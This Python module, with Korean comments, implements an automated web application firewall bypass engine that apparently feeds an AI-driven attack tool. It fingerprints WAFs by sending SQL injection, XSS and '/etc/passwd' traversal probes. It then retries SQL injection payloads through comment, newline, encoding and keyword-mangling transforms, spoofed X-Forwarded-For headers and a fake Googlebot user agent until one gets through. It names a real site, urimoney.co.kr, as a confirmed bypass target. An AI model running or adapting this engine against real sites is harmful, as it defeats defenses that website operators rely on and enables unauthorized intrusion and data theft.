"""
WAF Bypass Engine — 실전 경험 기반 WAF 우회 모음
urimoney(Nginx/OpenResty 406), cloudflare, ModSecurity 등
AI가 WAF 종류를 보고 우회 기법을 자동 선택
"""
from __future__ import annotations
import re
import time
import random
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable

from .http_probe import HttpProbe, ProbeResult


# ══════════════════════════════════════════════════════════════
# WAF 탐지 시그니처
# ══════════════════════════════════════════════════════════════
WAF_SIGNATURES: dict[str, dict] = {
    "cloudflare": {
        "status": [403, 503],
        "body": ["cloudflare", "cf-ray", "just a moment", "__cf_bm", "ray id"],
        "header_key": "cf-ray",
    },
    "nginx_openresty": {        # urimoney 경험
        "status": [406, 403],
        "body": ["406 not acceptable", "openresty", "nginx"],
        "header_val": {"server": ["nginx", "openresty"]},
    },
    "modsecurity": {
        "status": [403, 406],
        "body": ["mod_security", "modsecurity", "not acceptable!", "406 not"],
        "header_key": "x-modsecurity",
    },
    "aws_waf": {
        "status": [403],
        "body": ["aws", "request blocked", "x-amzn-requestid"],
        "header_key": "x-amzn-requestid",
    },
    "sucuri": {
        "status": [403],
        "body": ["sucuri", "website firewall", "access denied"],
    },
    "akamai": {
        "status": [403],
        "body": ["akamai", "reference #", "access denied"],
    },
    "f5_bigip": {
        "status": [403],
        "body": ["the requested url was rejected", "f5"],
        "header_key": "x-cnection",
    },
    "fortiweb": {
        "status": [403],
        "body": ["fortiweb", "fortigate", "blocked by fortiweb"],
    },
    "safe3": {
        "status": [403, 200],
        "body": ["safe3waf", "安全狗", "safedog"],
    },
    "d_shield": {
        "status": [403],
        "body": ["d盾", "d_shield", "iis防火墙"],
    },
    "yunsuo": {
        "status": [403],
        "body": ["yunsuo", "云锁"],
    },
    "generic": {
        "status": [403, 406, 501],
        "body": ["access denied", "forbidden", "blocked", "security", "firewall"],
    },
}


# ══════════════════════════════════════════════════════════════
# WAF 우회 기법 라이브러리
# 실전 경험 + CyberSecurity-Skills 03-Exploitation 기반
# ══════════════════════════════════════════════════════════════

class WafBypassLib:
    """WAF 우회 기법 모음 — 각 기법은 (name, transform_fn) 쌍"""

    # ── 공백 우회 ───────────────────────────────────────────────
    SPACE_BYPASSES = [
        ("tab",            lambda s: s.replace(" ", "\t")),
        ("url_encoded_tab",lambda s: s.replace(" ", "%09")),
        ("newline",        lambda s: s.replace(" ", "%0a")),       # urimoney 경험!
        ("cr_newline",     lambda s: s.replace(" ", "%0d%0a")),
        ("mysql_comment",  lambda s: s.replace(" ", "/**/")),      # urimoney 경험!
        ("plus",           lambda s: s.replace(" ", "+")),
        ("no_space",       lambda s: s.replace(" ", "")),
        ("multi_comment",  lambda s: s.replace(" ", "/*!*/")),
    ]

    # ── 키워드 우회 ─────────────────────────────────────────────
    KEYWORD_BYPASSES = [
        ("double_keyword",     lambda s: re.sub(r'\b(select|union|and|or|where|from|order)\b',
                                                lambda m: m.group()*2, s, flags=re.I)),
        ("mixed_case",         lambda s: "".join(
                                    c.upper() if i % 2 == 0 else c.lower()
                                    for i, c in enumerate(s))),
        ("mysql_inline",       lambda s: re.sub(
                                    r'\b(SELECT|UNION|AND|OR|FROM|WHERE)\b',
                                    lambda m: f"/*!{m.group()}*/", s, flags=re.I)),
        ("url_encode_keywords",lambda s: re.sub(
                                    r'(select|union|and|or)',
                                    lambda m: urllib.parse.quote(m.group()), s, flags=re.I)),
        ("hex_encode",         lambda s: re.sub(
                                    r"'([^']+)'",
                                    lambda m: f"0x{m.group(1).encode().hex()}", s)),
        ("char_function",      lambda s: re.sub(
                                    r"'([a-zA-Z]+)'",
                                    lambda m: f"CHAR({','.join(str(ord(c)) for c in m.group(1))})",
                                    s)),
    ]

    # ── 인코딩 우회 ─────────────────────────────────────────────
    ENCODING_BYPASSES = [
        ("double_url_encode",  lambda s: urllib.parse.quote(urllib.parse.quote(s))),
        ("html_entity",        lambda s: s.replace("<", "&lt;").replace(">", "&gt;")),
        ("unicode_escape",     lambda s: re.sub(r"(['\"])", lambda m: f"%u00{ord(m.group()):02x}", s)),
        ("base64_payload",     lambda s: s),  # 특수 케이스 — 별도 처리
    ]

    # ── HTTP 헤더 조작 ──────────────────────────────────────────
    HEADER_BYPASSES = [
        ("xff_localhost",    {"X-Forwarded-For": "127.0.0.1"}),
        ("xff_10net",        {"X-Forwarded-For": "10.0.0.1"}),
        ("xff_192net",       {"X-Forwarded-For": "192.168.1.1"}),
        ("x_real_ip",        {"X-Real-IP": "127.0.0.1"}),
        ("x_originating_ip", {"X-Originating-IP": "127.0.0.1"}),
        ("x_remote_ip",      {"X-Remote-IP": "127.0.0.1, 127.0.0.1"}),
        ("x_client_ip",      {"X-Client-IP": "127.0.0.1"}),
        ("true_client_ip",   {"True-Client-IP": "127.0.0.1"}),
        ("cluster_client",   {"Cluster-Client-IP": "127.0.0.1"}),
        ("forwarded",        {"Forwarded": "for=127.0.0.1;proto=https"}),
    ]

    # ── User-Agent 우회 ─────────────────────────────────────────
    UA_BYPASSES = [
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
        "curl/7.68.0",
        "python-requests/2.31.0",
        "sqlmap/1.7.8#stable (https://sqlmap.org)",   # SQLMap UA 허용하는 경우
    ]

    # ── 경로/파라미터 변형 ──────────────────────────────────────
    PATH_BYPASSES = [
        ("double_slash",    lambda p: p.replace("/", "//")),
        ("dot_slash",       lambda p: p.replace("/", "/./")),
        ("url_encode_slash",lambda p: p.replace("/", "%2f")),
        ("semicolon",       lambda p: p.replace("?", ";?")),
        ("null_byte",       lambda p: p.replace("=", "=%00")),
        ("param_pollution", lambda p: p + "&" + p.split("?")[1] if "?" in p else p),
    ]

    # ── Content-Type 변형 ───────────────────────────────────────
    CONTENT_TYPE_BYPASSES = [
        "application/x-www-form-urlencoded",
        "application/x-www-form-urlencoded; charset=utf-8",
        "application/json",
        "text/plain",
        "multipart/form-data",
        "application/xml",
    ]


# ══════════════════════════════════════════════════════════════
# WAF Detector
# ══════════════════════════════════════════════════════════════

@dataclass
class WafDetectResult:
    detected: bool
    waf_type: str
    confidence: str   # high / medium / low
    evidence: str
    bypass_priority: list[str] = field(default_factory=list)


class WafDetector:
    def __init__(self, probe: HttpProbe):
        self.probe = probe

    def detect(self, url: str) -> WafDetectResult:
        """다양한 페이로드로 WAF 탐지"""
        # 정상 요청 기준선
        base = self.probe.get(url)

        # WAF 유발 페이로드들
        probes = [
            url + "?id=1'",
            url + "?id=1 UNION SELECT 1,2,3--",
            url + "?id=<script>alert(1)</script>",
            url + "?id=../../../etc/passwd",
            url + "?id=1 AND SLEEP(3)--",
        ]

        waf_responses = []
        for purl in probes:
            r = self.probe.get(purl, timeout=8)
            if r.status in (403, 406, 501, 503) or r.status != base.status:
                waf_responses.append(r)
            time.sleep(0.2)

        if not waf_responses:
            return WafDetectResult(detected=False, waf_type="none",
                                   confidence="high", evidence="정상 응답")

        # WAF 종류 판별
        sample = waf_responses[0]
        body_lower = sample.body.lower()
        headers = {k.lower(): v.lower() for k, v in sample.headers.items()}

        for waf_name, sig in WAF_SIGNATURES.items():
            # 헤더 체크
            if "header_key" in sig and sig["header_key"] in headers:
                return self._make_result(waf_name, "high",
                    f"Header: {sig['header_key']}", sample.status)
            # Body 체크
            for kw in sig.get("body", []):
                if kw in body_lower:
                    return self._make_result(waf_name, "high",
                        f"Body keyword: {kw}", sample.status)
            # 상태코드 체크
            if sample.status in sig.get("status", []):
                confidence = "medium"
                return self._make_result(waf_name, confidence,
                    f"Status: {sample.status}", sample.status)

        # 탐지됐지만 종류 불명
        return WafDetectResult(
            detected=True, waf_type="generic", confidence="medium",
            evidence=f"Status {sample.status} for attack payload",
            bypass_priority=["space", "header", "encoding", "keyword"],
        )

    def _make_result(self, waf_type: str, confidence: str, evidence: str,
                     status: int) -> WafDetectResult:
        # WAF 종류별 우선 우회 전략
        priority_map = {
            "cloudflare":       ["header", "ua", "encoding", "space"],
            "nginx_openresty":  ["newline", "mysql_comment", "space", "keyword"],  # 실전 경험!
            "modsecurity":      ["space", "keyword", "encoding", "header"],
            "aws_waf":          ["encoding", "header", "space", "keyword"],
            "generic":          ["space", "keyword", "header", "encoding"],
        }
        return WafDetectResult(
            detected=True, waf_type=waf_type, confidence=confidence,
            evidence=f"{evidence} (HTTP {status})",
            bypass_priority=priority_map.get(waf_type, ["space", "keyword", "header"]),
        )


# ══════════════════════════════════════════════════════════════
# WAF Bypass Engine — AI 자율 선택
# ══════════════════════════════════════════════════════════════

@dataclass
class BypassAttempt:
    technique: str
    payload_original: str
    payload_modified: str
    headers_used: dict
    response_status: int
    response_body_preview: str
    bypassed: bool
    evidence: str = ""


class WafBypassEngine:
    """
    WAF가 탐지되면 자동으로 우회 기법을 순서대로 시도
    AI가 탐지 결과를 보고 최적 기법을 선택
    """

    def __init__(self, probe: HttpProbe, on_progress: Callable[[str], None] | None = None):
        self.probe = probe
        self.detector = WafDetector(probe)
        self.log = on_progress or (lambda s: None)

    def auto_bypass(
        self,
        url: str,
        payload: str,
        method: str = "GET",
        param: str = "id",
        post_data: dict | None = None,
    ) -> tuple[bool, BypassAttempt | None]:
        """
        WAF 자동 탐지 후 우회 기법 순서 시도
        성공 시 (True, 사용된 기법) 반환
        """
        # 1. WAF 탐지
        detect = self.detector.detect(url)
        if not detect.detected:
            self.log("  [WAF] WAF 없음 — 직접 공격 가능")
            return True, None

        self.log(f"  [WAF] 탐지됨: {detect.waf_type} (신뢰도: {detect.confidence})")
        self.log(f"  [WAF] 우선 우회 전략: {detect.bypass_priority}")

        # 2. 우선순위 순서대로 우회 시도
        for strategy in detect.bypass_priority:
            success, attempt = self._try_strategy(
                strategy, url, payload, method, param, post_data, detect.waf_type
            )
            if success:
                self.log(f"  [WAF✓] 우회 성공: {strategy} → {attempt.technique}")
                return True, attempt
            time.sleep(0.5)

        # 3. 전략별로 안 되면 조합 시도
        self.log("  [WAF] 단일 기법 실패 — 조합 시도...")
        success, attempt = self._try_combined(url, payload, method, param, post_data)
        if success:
            self.log(f"  [WAF✓] 조합 우회 성공: {attempt.technique}")
            return True, attempt

        self.log("  [WAF✗] 현재 기법으로 우회 실패")
        return False, None

    def _try_strategy(
        self, strategy: str, url: str, payload: str,
        method: str, param: str, post_data: dict | None,
        waf_type: str,
    ) -> tuple[bool, BypassAttempt | None]:

        if strategy == "newline" or strategy == "mysql_comment":
            # urimoney에서 검증된 공백 우회
            return self._try_space_bypass(url, payload, method, param, post_data)

        elif strategy == "space":
            return self._try_space_bypass(url, payload, method, param, post_data)

        elif strategy == "keyword":
            return self._try_keyword_bypass(url, payload, method, param, post_data)

        elif strategy == "header":
            return self._try_header_bypass(url, payload, method, param, post_data)

        elif strategy == "encoding":
            return self._try_encoding_bypass(url, payload, method, param, post_data)

        elif strategy == "ua":
            return self._try_ua_bypass(url, payload, method, param, post_data)

        return False, None

    def _try_space_bypass(self, url, payload, method, param, post_data):
        for name, transform in WafBypassLib.SPACE_BYPASSES:
            modified = transform(payload)
            r = self._send(url, modified, method, param, post_data)
            if self._is_bypassed(r):
                return True, BypassAttempt(
                    technique=f"space:{name}",
                    payload_original=payload, payload_modified=modified,
                    headers_used={}, response_status=r.status,
                    response_body_preview=r.body[:100],
                    bypassed=True,
                )
            time.sleep(0.2)
        return False, None

    def _try_keyword_bypass(self, url, payload, method, param, post_data):
        for name, transform in WafBypassLib.KEYWORD_BYPASSES:
            try:
                modified = transform(payload)
            except Exception:
                continue
            r = self._send(url, modified, method, param, post_data)
            if self._is_bypassed(r):
                return True, BypassAttempt(
                    technique=f"keyword:{name}",
                    payload_original=payload, payload_modified=modified,
                    headers_used={}, response_status=r.status,
                    response_body_preview=r.body[:100],
                    bypassed=True,
                )
            time.sleep(0.2)
        return False, None

    def _try_header_bypass(self, url, payload, method, param, post_data):
        for name, headers in WafBypassLib.HEADER_BYPASSES:
            r = self._send(url, payload, method, param, post_data, extra_headers=headers)
            if self._is_bypassed(r):
                return True, BypassAttempt(
                    technique=f"header:{name}",
                    payload_original=payload, payload_modified=payload,
                    headers_used=headers, response_status=r.status,
                    response_body_preview=r.body[:100],
                    bypassed=True,
                )
            time.sleep(0.2)
        return False, None

    def _try_encoding_bypass(self, url, payload, method, param, post_data):
        for name, transform in WafBypassLib.ENCODING_BYPASSES:
            try:
                modified = transform(payload)
            except Exception:
                continue
            r = self._send(url, modified, method, param, post_data)
            if self._is_bypassed(r):
                return True, BypassAttempt(
                    technique=f"encoding:{name}",
                    payload_original=payload, payload_modified=modified,
                    headers_used={}, response_status=r.status,
                    response_body_preview=r.body[:100],
                    bypassed=True,
                )
            time.sleep(0.2)
        return False, None

    def _try_ua_bypass(self, url, payload, method, param, post_data):
        for ua in WafBypassLib.UA_BYPASSES:
            r = self._send(url, payload, method, param, post_data,
                           extra_headers={"User-Agent": ua})
            if self._is_bypassed(r):
                return True, BypassAttempt(
                    technique=f"ua:{ua[:40]}",
                    payload_original=payload, payload_modified=payload,
                    headers_used={"User-Agent": ua}, response_status=r.status,
                    response_body_preview=r.body[:100],
                    bypassed=True,
                )
            time.sleep(0.15)
        return False, None

    def _try_combined(self, url, payload, method, param, post_data):
        """공백 + 키워드 + 헤더 조합"""
        for sp_name, sp_fn in WafBypassLib.SPACE_BYPASSES[:4]:
            for kw_name, kw_fn in WafBypassLib.KEYWORD_BYPASSES[:3]:
                for hdr_name, headers in WafBypassLib.HEADER_BYPASSES[:3]:
                    try:
                        modified = kw_fn(sp_fn(payload))
                    except Exception:
                        continue
                    r = self._send(url, modified, method, param, post_data,
                                   extra_headers=headers)
                    if self._is_bypassed(r):
                        return True, BypassAttempt(
                            technique=f"combined:{sp_name}+{kw_name}+{hdr_name}",
                            payload_original=payload, payload_modified=modified,
                            headers_used=headers, response_status=r.status,
                            response_body_preview=r.body[:100],
                            bypassed=True,
                        )
                    time.sleep(0.15)
        return False, None

    # ── 내부 헬퍼 ────────────────────────────────────────────────

    def _send(self, url: str, payload: str, method: str, param: str,
              post_data: dict | None, extra_headers: dict | None = None) -> ProbeResult:
        if method.upper() == "GET":
            target_url = re.sub(
                rf"({re.escape(param)}=)[^&]*",
                lambda m: m.group(1) + urllib.parse.quote(payload, safe=""),
                url,
            )
            if param not in url:
                target_url = url + ("&" if "?" in url else "?") + f"{param}={urllib.parse.quote(payload, safe='')}"
            return self.probe.get(target_url, headers=extra_headers)
        else:
            data = dict(post_data or {})
            data[param] = payload
            return self.probe.post(url, data, headers=extra_headers)

    def _is_bypassed(self, r: ProbeResult) -> bool:
        """WAF 차단 아님 = 우회 성공"""
        if r.status in (403, 406, 501, 503):
            return False
        if r.error:
            return False
        blocked_kw = ["access denied", "forbidden", "blocked", "not acceptable",
                      "security violation", "잘못된 접근", "차단"]
        body_lower = r.body.lower()
        return not any(k in body_lower for k in blocked_kw)

    def get_bypass_summary(self, waf_type: str) -> str:
        """DeepSeek V4 Pro 전달용 — WAF 우회 전략 상세 설명"""
        summaries = {
            "nginx_openresty": """
Nginx/OpenResty WAF (406 Not Acceptable) 우회 전략:
1. 공백 → %0a (URL 인코딩된 줄바꿈): 'UNION%0aSELECT'
2. 공백 → /**/ (MySQL 인라인 주석): 'UNION/**/SELECT'
3. 키워드 MySQL 조건부 주석: '/*!UNION*/ /*!SELECT*/'
4. X-Forwarded-For 헤더로 내부 IP 위장
5. User-Agent를 Googlebot으로 변경
실전: urimoney.co.kr에서 %0a, /**/ 우회 성공 확인""",

            "cloudflare": """
Cloudflare WAF 우회 전략:
1. URL 더블 인코딩: %27 → %2527
2. Unicode 변형: SELECT → \uSELECT
3. Case mixing: SeLeCt
4. 인라인 주석: UN/**/ION SE/**/LECT
5. 느린 전송 (chunked transfer)
6. Cloudflare JS Challenge 시 실제 브라우저 필요""",

            "modsecurity": """
ModSecurity WAF 우회 전략:
1. 공백 다양화: tab(%09), newline(%0a), /**/, /*!*/
2. 대소문자 혼합: SeLeCt, UnIoN
3. HTML 인코딩: SELECT → S&#69;LECT
4. 중복 URL 인코딩
5. NULL 바이트 삽입: SEL%00ECT
6. HTTP Parameter Pollution""",

            "generic": """
범용 WAF 우회 전략 (순서대로 시도):
1. 공백 변형: /**/, %09, %0a, %0d%0a
2. 키워드 인라인 주석: /*!UNION*/
3. X-Forwarded-For: 127.0.0.1
4. URL 더블 인코딩
5. 대소문자 혼합
6. HEX 인코딩: 0x41 대신 A""",
        }
        return summaries.get(waf_type, summaries["generic"])
